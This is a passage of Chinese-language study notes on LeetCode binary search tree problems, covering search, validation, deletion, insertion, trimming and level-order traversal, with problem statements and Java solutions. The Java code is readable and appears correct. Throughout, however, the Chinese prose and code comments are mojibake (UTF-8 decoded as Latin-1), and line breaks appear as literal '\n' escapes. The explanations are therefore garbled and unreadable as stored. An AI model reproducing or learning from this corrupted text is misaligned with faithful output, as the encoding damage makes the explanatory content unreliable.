[4,2,7,1,3], val = 5\nè¾“å‡ºï¼š[]\n```\n\n------\n\n```java\n//é€’å½’\nclass Solution {\n    public TreeNode searchBST(TreeNode root, int target) {\n        if (root == null) {\n            return null;\n        }\n        // å»å·¦å­æ ‘æœç´¢\n        if (root.val > target) {\n            return searchBST(root.left, target);\n        }\n        // å»å³å­æ ‘æœç´¢\n        if (root.val < target) {\n            return searchBST(root.right, target);\n        }\n        return root;\n    }\n}\n\n//è¿­ä»£\nclass Solution {\n    public TreeNode searchBST(TreeNode root, int val) {\n        while (root != null) {\n            if (val == root.val) {\n                return root;\n            }\n            root = val < root.val ? root.left : root.right;\n        }\n        return null;\n    }\n}\n```\n\n#### [98. éªŒè¯äºŒå‰æœç´¢æ ‘](https://leetcode.cn/problems/validate-binary-search-tree/)\n\nç»™ä½ ä¸€ä¸ªäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œåˆ¤æ–­å…¶æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„äºŒå‰æœç´¢æ ‘ã€‚\n\n**æœ‰æ•ˆ** äºŒå‰æœç´¢æ ‘å®šä¹‰å¦‚ä¸‹ï¼š\n\n- èŠ‚ç‚¹çš„å·¦å­æ ‘åªåŒ…å« **å°äº** å½“å‰èŠ‚ç‚¹çš„æ•°ã€‚\n- èŠ‚ç‚¹çš„å³å­æ ‘åªåŒ…å« **å¤§äº** å½“å‰èŠ‚ç‚¹çš„æ•°ã€‚\n- æ‰€æœ‰å·¦å­æ ‘å’Œå³å­æ ‘è‡ªèº«å¿…é¡»ä¹Ÿæ˜¯äºŒå‰æœç´¢æ ‘ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/12/01/tree1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [2,1,3]\nè¾“å‡ºï¼štrue\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/12/01/tree2.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [5,1,4,null,null,3,6]\nè¾“å‡ºï¼šfalse\nè§£é‡Šï¼šæ ¹èŠ‚ç‚¹çš„å€¼æ˜¯ 5 ï¼Œä½†æ˜¯å³å­èŠ‚ç‚¹çš„å€¼æ˜¯ 4 ã€‚\n```\n\n------\n\nè¯¯åŒºï¼šBST ä¸æ˜¯å·¦å°å³å¤§ä¹ˆï¼Œé‚£åªè¦æ£€æŸ¥ `root.val > root.left.val` ä¸” `root.val < root.right.val` ä¸å°±è¡Œäº†ï¼Ÿè¿™æ ·æ˜¯ä¸å¯¹çš„ï¼Œå› ä¸º BST å·¦å°å³å¤§çš„ç‰¹æ€§æ˜¯æŒ‡ `root.val` è¦æ¯”å·¦å­æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½æ›´å¤§ï¼Œè¦æ¯”å³å­æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½å°ï¼Œåªæ£€æŸ¥å·¦å³ä¸¤ä¸ªå­èŠ‚ç‚¹å½“ç„¶æ˜¯ä¸å¤Ÿçš„ã€‚\n\n```java\nclass Solution {\n    boolean isValidBST(TreeNode root) {\n        return isValidBST(root, null, null);\n    }\n\n    /* é™å®šä»¥ root ä¸ºæ ¹çš„å­æ ‘èŠ‚ç‚¹å¿…é¡»æ»¡è¶³ max.val > root.val > min.val */\n    boolean isValidBST(TreeNode root, TreeNode min, TreeNode max) {\n        // base case\n        if (root == null) return true;\n        // è‹¥ root.val ä¸ç¬¦åˆ max å’Œ min çš„é™åˆ¶ï¼Œè¯´æ˜ä¸æ˜¯åˆæ³• BST\n        if (min != null && root.val <= min.val) return false;\n        if (max != null && root.val >= max.val) return false;\n        // é™å®šå·¦å­æ ‘çš„æœ€å¤§å€¼æ˜¯ root.valï¼Œå³å­æ ‘çš„æœ€å°å€¼æ˜¯ root.val\n        return isValidBST(root.left, min, root) \n            && isValidBST(root.right, root, max);\n    }\n}\n```\n\n#### [450. åˆ é™¤äºŒå‰æœç´¢æ ‘ä¸­çš„èŠ‚ç‚¹](https://leetcode.cn/problems/delete-node-in-a-bst/)\n\nç»™å®šä¸€ä¸ªäºŒå‰æœç´¢æ ‘çš„æ ¹èŠ‚ç‚¹ **root** å’Œä¸€ä¸ªå€¼ **key**ï¼Œåˆ é™¤äºŒå‰æœç´¢æ ‘ä¸­çš„ **key** å¯¹åº”çš„èŠ‚ç‚¹ï¼Œå¹¶ä¿è¯äºŒå‰æœç´¢æ ‘çš„æ€§è´¨ä¸å˜ã€‚è¿”å›äºŒå‰æœç´¢æ ‘ï¼ˆæœ‰å¯èƒ½è¢«æ›´æ–°ï¼‰çš„æ ¹èŠ‚ç‚¹çš„å¼•ç”¨ã€‚\n\nä¸€èˆ¬æ¥è¯´ï¼Œåˆ é™¤èŠ‚ç‚¹å¯åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼š\n\n1. é¦–å…ˆæ‰¾åˆ°éœ€è¦åˆ é™¤çš„èŠ‚ç‚¹ï¼›\n2. å¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ é™¤å®ƒã€‚\n\n**ç¤ºä¾‹ 1:**\n\n![](https://assets.leetcode.com/uploads/2020/09/04/del_node_1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [5,3,6,2,4,null,7], key = 3\nè¾“å‡ºï¼š[5,4,6,2,null,null,7]\nè§£é‡Šï¼šç»™å®šéœ€è¦åˆ é™¤çš„èŠ‚ç‚¹å€¼æ˜¯ 3ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆæ‰¾åˆ° 3 è¿™ä¸ªèŠ‚ç‚¹ï¼Œç„¶ååˆ é™¤å®ƒã€‚\nä¸€ä¸ªæ­£ç¡®çš„ç­”æ¡ˆæ˜¯ [5,4,6,2,null,null,7], å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\nå¦ä¸€ä¸ªæ­£ç¡®ç­”æ¡ˆæ˜¯ [5,2,6,null,4,null,7]ã€‚\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥: root = [5,3,6,2,4,null,7], key = 0\nè¾“å‡º: [5,3,6,2,4,null,7]\nè§£é‡Š: äºŒå‰æ ‘ä¸åŒ…å«å€¼ä¸º 0 çš„èŠ‚ç‚¹\n```\n\n**ç¤ºä¾‹ 3:**\n\n```properties\nè¾“å…¥: root = [], key = 0\nè¾“å‡º: []\n```\n\n---\n\n**æƒ…å†µ 1**ï¼š`A` æ°å¥½æ˜¯æœ«ç«¯èŠ‚ç‚¹ï¼Œä¸¤ä¸ªå­èŠ‚ç‚¹éƒ½ä¸ºç©ºï¼Œé‚£ä¹ˆå®ƒå¯ä»¥å½“åœºå»ä¸–äº†ï¼š\n\n![](https://img.jwt1399.top/img/202212041947805.png)\n\n**æƒ…å†µ 2**ï¼š`A` åªæœ‰ä¸€ä¸ªéç©ºå­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒè¦è®©è¿™ä¸ªå­©å­æ¥æ›¿è‡ªå·±çš„ä½ç½®ï¼š\n\n![](https://img.jwt1399.top/img/202212041947953.png)\n\n**æƒ…å†µ 3**ï¼š`A` æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œéº»çƒ¦äº†ï¼Œä¸ºäº†ä¸ç ´å BST çš„æ€§è´¨ï¼Œ`A` å¿…é¡»æ‰¾åˆ°å·¦å­æ ‘ä¸­æœ€å¤§çš„é‚£ä¸ªèŠ‚ç‚¹æˆ–è€…å³å­æ ‘ä¸­æœ€å°çš„é‚£ä¸ªèŠ‚ç‚¹æ¥æ¥æ›¿è‡ªå·±ï¼Œæˆ‘çš„è§£æ³•æ˜¯ç”¨å³å­æ ‘ä¸­æœ€å°èŠ‚ç‚¹æ¥æ›¿æ¢ï¼š\n\n![](https://img.jwt1399.top/img/202212041947896.png)\n\n```java\n//è§£é¢˜æ¡†æ¶\nTreeNode deleteNode(TreeNode root, int key) {\n    if (root == null) return null;\n    if (root.val == key) {\n        // æ‰¾åˆ°å•¦ï¼Œè¿›è¡Œåˆ é™¤\n    } else if (root.val > key) {\n        // å»å·¦å­æ ‘æ‰¾\n        root.left = deleteNode(root.left, key);\n    } else if (root.val < key) {\n        // å»å³å­æ ‘æ‰¾\n        root.right = deleteNode(root.right, key);\n    }\n    return root;\n}\n```\n\n```java\nclass Solution {\n    public TreeNode deleteNode(TreeNode root, int key) {\n        if (root == null) return null;\n        if (root.val == key) {\n            // è¿™ä¸¤ä¸ª if æŠŠæƒ…å†µ 1 å’Œ 2 éƒ½æ­£ç¡®å¤„ç†äº†\n            if (root.left == null) return root.right;\n            if (root.right == null) return root.left;\n            // æƒ…å†µ 3\n            // è·å¾—å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹\n            TreeNode minNode = getMin(root.right);\n            // åˆ é™¤å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹\n            root.right = deleteNode(root.right, minNode.val);\n            // ç”¨å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹æ›¿æ¢ root èŠ‚ç‚¹\n            minNode.left = root.left;\n            minNode.right = root.right;\n            root = minNode;\n        } else if (root.val > key) {\n            root.left = deleteNode(root.left, key);\n        } else if (root.val < key) {\n            root.right = deleteNode(root.right, key);\n        }\n        return root;\n    }\n\n    TreeNode getMin(TreeNode node) {\n        // BST æœ€å·¦è¾¹çš„å°±æ˜¯æœ€å°çš„\n        while (node.left != null) node = node.left;\n        return node;\n    }\n}\n```\n\næ³¨æ„ï¼š\n\næƒ…å†µ 3 æ—¶é€šè¿‡ä¸€ç³»åˆ—ç•¥å¾®å¤æ‚çš„é“¾è¡¨æ“ä½œäº¤æ¢ `root` å’Œ `minNode` ä¸¤ä¸ªèŠ‚ç‚¹ï¼š\n\n```java\n// å¤„ç†æƒ…å†µ 3\n// è·å¾—å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹\nTreeNode minNode = getMin(root.right);\n// åˆ é™¤å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹\nroot.right = deleteNode(root.right, minNode.val);\n// ç”¨å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹æ›¿æ¢ root èŠ‚ç‚¹\nminNode.left = root.left;\nminNode.right = root.right;\nroot = minNode;\n```\n\næœ‰çš„è¯»è€…å¯èƒ½ä¼šç–‘æƒ‘ï¼Œæ›¿æ¢ `root` èŠ‚ç‚¹ä¸ºä»€ä¹ˆè¿™ä¹ˆéº»çƒ¦ï¼Œç›´æ¥æ”¹ `val` å­—æ®µä¸å°±è¡Œäº†ï¼Ÿçœ‹èµ·æ¥è¿˜æ›´ç®€æ´æ˜“æ‡‚ï¼š\n\n```java\n// å¤„ç†æƒ…å†µ 3\n// è·å¾—å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹\nTreeNode minNode = getMin(root.right);\n// åˆ é™¤å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹\nroot.right = deleteNode(root.right, minNode.val);\n// ç”¨å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹æ›¿æ¢ root èŠ‚ç‚¹\nroot.val = minNode.val;\n```\n\nä»…å¯¹äºè¿™é“ç®—æ³•é¢˜æ¥è¯´æ˜¯å¯ä»¥çš„ï¼Œä½†è¿™æ ·æ“ä½œå¹¶ä¸å®Œç¾ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¸ä¼šé€šè¿‡ä¿®æ”¹èŠ‚ç‚¹å†…éƒ¨çš„å€¼æ¥äº¤æ¢èŠ‚ç‚¹ã€‚å› ä¸ºåœ¨å®é™…åº”ç”¨ä¸­ï¼ŒBST èŠ‚ç‚¹å†…éƒ¨çš„æ•°æ®åŸŸæ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ï¼Œå¯ä»¥éå¸¸å¤æ‚ï¼Œè€Œ BST ä½œä¸ºæ•°æ®ç»“æ„ï¼ˆä¸€ä¸ªå·¥å…·äººï¼‰ï¼Œå…¶æ“ä½œåº”è¯¥å’Œå†…éƒ¨å­˜å‚¨çš„æ•°æ®åŸŸè§£è€¦ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å€¾å‘äºä½¿ç”¨æŒ‡é’ˆæ“ä½œæ¥äº¤æ¢èŠ‚ç‚¹ï¼Œæ ¹æœ¬æ²¡å¿…è¦å…³å¿ƒå†…éƒ¨æ•°æ®ã€‚\n\n#### [701. äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œ](https://leetcode.cn/problems/insert-into-a-binary-search-tree/)\n\nç»™å®šäºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰çš„æ ¹èŠ‚ç‚¹ `root` å’Œè¦æ’å…¥æ ‘ä¸­çš„å€¼ `value` ï¼Œå°†å€¼æ’å…¥äºŒå‰æœç´¢æ ‘ã€‚ è¿”å›æ’å…¥åäºŒå‰æœç´¢æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚ è¾“å…¥æ•°æ® **ä¿è¯** ï¼Œæ–°å€¼å’ŒåŸå§‹äºŒå‰æœç´¢æ ‘ä¸­çš„ä»»æ„èŠ‚ç‚¹å€¼éƒ½ä¸åŒã€‚\n\n**æ³¨æ„**ï¼Œå¯èƒ½å­˜åœ¨å¤šç§æœ‰æ•ˆçš„æ’å…¥æ–¹å¼ï¼Œåªè¦æ ‘åœ¨æ’å…¥åä»ä¿æŒä¸ºäºŒå‰æœç´¢æ ‘å³å¯ã€‚ ä½ å¯ä»¥è¿”å› **ä»»æ„æœ‰æ•ˆçš„ç»“æœ** \n\n**ç¤ºä¾‹ 1ï¼š**\n\n![img](https://assets.leetcode.com/uploads/2020/10/05/insertbst.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [4,2,7,1,3], val = 5\nè¾“å‡ºï¼š[4,2,7,1,3,5]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [40,20,60,10,30,50,70], val = 25\nè¾“å‡ºï¼š[40,20,60,10,30,50,70,null,null,25]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [4,2,7,1,3,null,null,null,null,null,null], val = 5\nè¾“å‡ºï¼š[4,2,7,1,3,5]\n```\n\n------\n\n\n\n```java\n//é€’å½’\nclass Solution {\n    public TreeNode insertIntoBST(TreeNode root, int val) {\n        // æ‰¾åˆ°ç©ºä½ç½®æ’å…¥æ–°èŠ‚ç‚¹\n        if (root == null) return new TreeNode(val);\n        // å»å³å­æ ‘æœç´¢\n        if (root.val < val) {\n            root.right = insertIntoBST(root.right, val);\n        }\n        // å»å·¦å­æ ‘æœç´¢ \n        if (root.val > val) {\n            root.left = insertIntoBST(root.left, val);\n        }     \n        return root;\n    }\n}\n\n//è¿­ä»£\nclass Solution {\n    public TreeNode insertIntoBST(TreeNode root, int val) {\n        if (root == null) {\n            return new TreeNode(val);\n        }\n        TreeNode pos = root;\n        while (pos != null) {\n            if (val < pos.val) {\n                if (pos.left == null) {\n                    pos.left = new TreeNode(val);\n                    break;\n                } else {\n                    pos = pos.left;\n                }\n            } else {\n                if (pos.right == null) {\n                    pos.right = new TreeNode(val);\n                    break;\n                } else {\n                    pos = pos.right;\n                }\n            }\n        }\n        return root;\n    }\n}\n```\n\n#### [530. äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®](https://leetcode.cn/problems/minimum-absolute-difference-in-bst/)\n\n> æœ¬é¢˜ä¸[783. äºŒå‰æœç´¢æ ‘èŠ‚ç‚¹æœ€å°è·ç¦»](https://leetcode.cn/problems/minimum-distance-between-bst-nodes/)ç›¸åŒ\n\nç»™ä½ ä¸€ä¸ªäºŒå‰æœç´¢æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œè¿”å› **æ ‘ä¸­ä»»æ„ä¸¤ä¸åŒèŠ‚ç‚¹å€¼ä¹‹é—´çš„æœ€å°å·®å€¼** ã€‚\n\nå·®å€¼æ˜¯ä¸€ä¸ªæ­£æ•°ï¼Œå…¶æ•°å€¼ç­‰äºä¸¤å€¼ä¹‹å·®çš„ç»å¯¹å€¼ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/05/bst1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [4,2,6,1,3]\nè¾“å‡ºï¼š1\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/05/bst2.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,0,48,null,null,12,49]\nè¾“å‡ºï¼š1\n```\n\n---\n\n\nä¸­åºéå†ä¼šæœ‰åºéå† BST çš„èŠ‚ç‚¹ï¼Œéå†è¿‡ç¨‹ä¸­è®¡ç®—æœ€å°å·®å€¼å³å¯ã€‚\n\nä½¿å½“å‰èŠ‚ç‚¹å‡å»ä¸Šä¸ªèŠ‚ç‚¹ï¼Œæ¯”è¾ƒå·®å€¼ï¼Œæœ€å°çš„å°±æ˜¯ç­”æ¡ˆã€‚\n\n```java\nclass Solution {\n    public int getMinimumDifference(TreeNode root) {\n        dfs(root);\n        return res;\n    }\n\n    TreeNode prev = null;// è®°å½•ä¸Šä¸€ä¸ªéå†çš„ç»“ç‚¹\n    int res = Integer.MAX_VALUE;\n\n    // éå†å‡½æ•°\n    void dfs(TreeNode root) {\n        if (root == null) return;\n        dfs(root.left);\n        // ä¸­åºéå†ä½ç½®\n        if (prev != null) {\n            res = Math.min(res, root.val - prev.val);\n        }\n        prev = root;\n        dfs(root.right);\n    }\n}\n```\n\n[501. äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°](https://leetcode.cn/problems/find-mode-in-binary-search-tree/)\n\nç»™ä½ ä¸€ä¸ªå«é‡å¤å€¼çš„äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œæ‰¾å‡ºå¹¶è¿”å› BST ä¸­çš„æ‰€æœ‰ [ä¼—æ•°](https://baike.baidu.com/item/ä¼—æ•°/44796)ï¼ˆå³ï¼Œå‡ºç°é¢‘ç‡æœ€é«˜çš„å…ƒç´ ï¼‰ã€‚å¦‚æœæ ‘ä¸­æœ‰ä¸æ­¢ä¸€ä¸ªä¼—æ•°ï¼Œå¯ä»¥æŒ‰ **ä»»æ„é¡ºåº** è¿”å›ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/03/11/mode-tree.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,null,2,2]\nè¾“å‡ºï¼š[2]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [0]\nè¾“å‡ºï¼š[0]\n```\n\n------\n\n```java\nclass Solution {\n\n    ArrayList<Integer> list = new ArrayList<>();\n    //å‰ä¸€ä¸ªèŠ‚ç‚¹\n    TreeNode prev = null;\n    // å½“å‰å…ƒç´ çš„é‡å¤æ¬¡æ•°\n    int curCount = 0;\n    // æœ€é•¿ç›¸åŒåºåˆ—é•¿åº¦\n    int maxCount = 0;\n\n    public int[] findMode(TreeNode root) {\n        dfs(root);\n        int[] res = new int[list.size()];\n        for(int i = 0; i < res.length; i++){\n            res[i] = list.get(i);\n        }\n        return res;\n    }\n    void dfs(TreeNode root){\n        if(root == null) return ;\n        dfs(root.left);\n\n        // ä¸­åºéå†ä½ç½®\n        if(prev == null){ // ç¬¬ä¸€ä¸ªèŠ‚ç‚¹\n            // åˆå§‹åŒ–\n            curCount = 1;\n            maxCount = 1;\n            list.add(root.val);\n        } else if(root.val == prev.val){ // ä¸å‰ä¸€ä¸ªèŠ‚ç‚¹æ•°å€¼ç›¸åŒ\n            curCount++;\n            if (curCount == maxCount) {\n                // root.val æ˜¯ä¼—æ•°\n                list.add(root.val);\n            } else if (curCount > maxCount) {\n                // æ›´æ–°ä¼—æ•°\n                list.clear();\n                maxCount = curCount;\n                list.add(root.val);\n            }\n        } else { // ä¸å‰ä¸€ä¸ªèŠ‚ç‚¹æ•°å€¼ä¸åŒ\n            curCount = 1;\n            if (curCount == maxCount) {\n                    list.add(root.val);\n                }\n        }\n        // æ›´æ–° prev\n        prev = root;\n\n        dfs(root.right);\n    }\n}\n```\n\n#### [669. ä¿®å‰ªäºŒå‰æœç´¢æ ‘](https://leetcode.cn/problems/trim-a-binary-search-tree/)\n\nç»™ä½ äºŒå‰æœç´¢æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼ŒåŒæ—¶ç»™å®šæœ€å°è¾¹ç•Œ`low` å’Œæœ€å¤§è¾¹ç•Œ `high`ã€‚é€šè¿‡ä¿®å‰ªäºŒå‰æœç´¢æ ‘ï¼Œä½¿å¾—æ‰€æœ‰èŠ‚ç‚¹çš„å€¼åœ¨`[low, high]`ä¸­ã€‚ä¿®å‰ªæ ‘ **ä¸åº”è¯¥** æ”¹å˜ä¿ç•™åœ¨æ ‘ä¸­çš„å…ƒç´ çš„ç›¸å¯¹ç»“æ„ (å³ï¼Œå¦‚æœæ²¡æœ‰è¢«ç§»é™¤ï¼ŒåŸæœ‰çš„çˆ¶ä»£å­ä»£å…³ç³»éƒ½åº”å½“ä¿ç•™)ã€‚ å¯ä»¥è¯æ˜ï¼Œå­˜åœ¨ **å”¯ä¸€çš„ç­”æ¡ˆ** ã€‚\n\næ‰€ä»¥ç»“æœåº”å½“è¿”å›ä¿®å‰ªå¥½çš„äºŒå‰æœç´¢æ ‘çš„æ–°çš„æ ¹èŠ‚ç‚¹ã€‚æ³¨æ„ï¼Œæ ¹èŠ‚ç‚¹å¯èƒ½ä¼šæ ¹æ®ç»™å®šçš„è¾¹ç•Œå‘ç”Ÿæ”¹å˜ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/09/09/trim1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,0,2], low = 1, high = 2\nè¾“å‡ºï¼š[1,null,2]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/09/09/trim2.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [3,0,4,null,2,null,null,1], low = 1, high = 3\nè¾“å‡ºï¼š[3,2,null,1]\n```\n\n------\n\nå¦‚æœä¸€ä¸ªèŠ‚ç‚¹çš„å€¼æ²¡æœ‰è½åœ¨ `[lo, hi]` ä¸­ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š\n\n1ã€**`root.val < lo`ï¼Œè¿™ç§æƒ…å†µä¸‹ `root` èŠ‚ç‚¹æœ¬èº«å’Œ `root` çš„å·¦å­æ ‘å…¨éƒ½æ˜¯å°äº `lo` çš„ï¼Œéƒ½éœ€è¦è¢«å‰ªæ‰**ã€‚\n\n2ã€**`root.val > hi`ï¼Œè¿™ç§æƒ…å†µä¸‹ `root` èŠ‚ç‚¹æœ¬èº«å’Œ `root` çš„å³å­æ ‘å…¨éƒ½æ˜¯å¤§äº `hi` çš„ï¼Œéƒ½éœ€è¦è¢«å‰ªæ‰**ã€‚\n\n```java\nclass Solution {\n    // å®šä¹‰ï¼šåˆ é™¤ BST ä¸­å°äº low å’Œå¤§äº high çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œè¿”å›ç»“æœ BST\n    public TreeNode trimBST(TreeNode root, int low, int high) {\n        if (root == null) return null;\n\n        if (root.val < low) {\n            // ç›´æ¥è¿”å› root.right\n            // ç­‰äºåˆ é™¤ root ä»¥åŠ root çš„å·¦å­æ ‘\n            return trimBST(root.right, low, high);\n        }\n        if (root.val > high) {\n            // ç›´æ¥è¿”å› root.left\n            // ç­‰äºåˆ é™¤ root ä»¥åŠ root çš„å³å­æ ‘\n            return trimBST(root.left, low, high);\n        }\n\n        // é—­åŒºé—´ [lo, hi] å†…çš„èŠ‚ç‚¹ä»€ä¹ˆéƒ½ä¸åš\n        root.left = trimBST(root.left, low, high);\n        root.right = trimBST(root.right, low, high);\n\n        return root;\n    }\n}\n```\n\n#### [108. å°†æœ‰åºæ•°ç»„è½¬æ¢ä¸ºäºŒå‰æœç´¢æ ‘](https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/)\n\nç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ `nums` ï¼Œå…¶ä¸­å…ƒç´ å·²ç»æŒ‰ **å‡åº** æ’åˆ—ï¼Œè¯·ä½ å°†å…¶è½¬æ¢ä¸ºä¸€æ£µ **é«˜åº¦å¹³è¡¡** äºŒå‰æœç´¢æ ‘ã€‚\n\n**é«˜åº¦å¹³è¡¡** äºŒå‰æ ‘æ˜¯ä¸€æ£µæ»¡è¶³ã€Œæ¯ä¸ªèŠ‚ç‚¹çš„å·¦å³ä¸¤ä¸ªå­æ ‘çš„é«˜åº¦å·®çš„ç»å¯¹å€¼ä¸è¶…è¿‡ 1 ã€çš„äºŒå‰æ ‘ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/18/btree1.jpg)\n\n```properties\nè¾“å…¥ï¼šnums = [-10,-3,0,5,9]\nè¾“å‡ºï¼š[0,-3,9,-10,null,5]\nè§£é‡Šï¼š[0,-10,5,null,-3,null,9] ä¹Ÿå°†è¢«è§†ä¸ºæ­£ç¡®ç­”æ¡ˆï¼š\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/18/btree.jpg)\n\n```properties\nè¾“å…¥ï¼šnums = [1,3]\nè¾“å‡ºï¼š[3,1]\nè§£é‡Šï¼š[1,null,3] å’Œ [3,1] éƒ½æ˜¯é«˜åº¦å¹³è¡¡äºŒå‰æœç´¢æ ‘ã€‚\n```\n\n------\n\n```java\nclass Solution {\n    public TreeNode sortedArrayToBST(int[] nums) {\n        return build(nums, 0, nums.length - 1);\n    }\n    TreeNode build(int[] nums, int left, int right){\n        if(left > right) return null;\n        //int mid = (left + right) / 2;\n        int mid = left + ((right - left) >> 1);// é˜²æ­¢æº¢å‡º ç­‰åŒäº(left + right)/2\n        TreeNode root = new TreeNode(nums[mid]);\n        // é€’å½’æ„å»ºå·¦å­æ ‘\n        root.left = build(nums, left, mid - 1);\n        // é€’å½’æ„é€ å³å­æ ‘\n        root.right = build(nums, mid + 1, right);\n        return root;\n    }\n}\n```\n\n[109. æœ‰åºé“¾è¡¨è½¬æ¢äºŒå‰æœç´¢æ ‘](https://leetcode.cn/problems/convert-sorted-list-to-binary-search-tree/description/)\n\n[1382. å°†äºŒå‰æœç´¢æ ‘å˜å¹³è¡¡ ](https://leetcode.cn/problems/balance-a-binary-search-tree/)\n\n\n\n###  å±‚åºéå†ç›¸å…³é¢˜ç›®\n\n#### [107. äºŒå‰æ ‘çš„å±‚åºéå† II ](https://leetcode.cn/problems/binary-tree-level-order-traversal-ii/)\n\nç»™ä½ äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œè¿”å›å…¶èŠ‚ç‚¹å€¼ **è‡ªåº•å‘ä¸Šçš„å±‚åºéå†** ã€‚ ï¼ˆå³æŒ‰ä»å¶å­èŠ‚ç‚¹æ‰€åœ¨å±‚åˆ°æ ¹èŠ‚ç‚¹æ‰€åœ¨çš„å±‚ï¼Œé€å±‚ä»å·¦å‘å³éå†ï¼‰\n\n```java\nclass Solution {\n    public List<List<Integer>> levelOrderBottom(TreeNode root) {\n        List<List<Integer>> res = new ArrayList<List<Integer>>();\n        if (root == null) {\n            return res;\n        }\n        Queue<TreeNode> queue = new LinkedList<TreeNode>();\n        queue.offer(root);\n        while (!queue.isEmpty()) {\n            List<Integer> level = new ArrayList<Integer>();\n            int currentLevelSize = queue.size();\n            for (int i = 1; i <= currentLevelSize; ++i) {\n                TreeNode node = queue.poll();\n                level.add(node.val);\n                if (node.left != null) {\n                    queue.offer(node.left);\n                }\n                if (node.right != null) {\n                    queue.offer(node.right);\n                }\n            }\n            // res.add(level);\n            res.add(0, level);//å¤´æ’æ³•\n        }\n        // Collections.reverse(res);\n        return res;\n    }\n}\n```\n\n#### [637. äºŒå‰æ ‘çš„å±‚å¹³å‡å€¼](https://leetcode.cn/problems/average-of-levels-in-binary-tree/description/)\n\nç»™å®šä¸€ä¸ªéç©ºäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` , ä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ¯ä¸€å±‚èŠ‚ç‚¹çš„å¹³å‡å€¼ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [3,9,20,null,null,15,7]\nè¾“å‡ºï¼š[3.00000,14.50000,11.00000]\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥ï¼šroot = [3,9,20,15,7]\nè¾“å‡ºï¼š[3.00000,14.50000,11.00000]\n```\n\n```java\nclass Solution {\n    public List<Double> averageOfLevels(TreeNode root) {\n        List<Double> res = new ArrayList<>();\n        if(root == null) return res;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            double sum = 0;\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                sum += node.val;\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n            res.add(sum / n);\n        }\n        return res;\n    }\n}\n```\n\n#### [429. N å‰æ ‘çš„å±‚åºéå†](https://leetcode.cn/problems/n-ary-tree-level-order-traversal/)\n\nç»™å®šä¸€ä¸ª N å‰æ 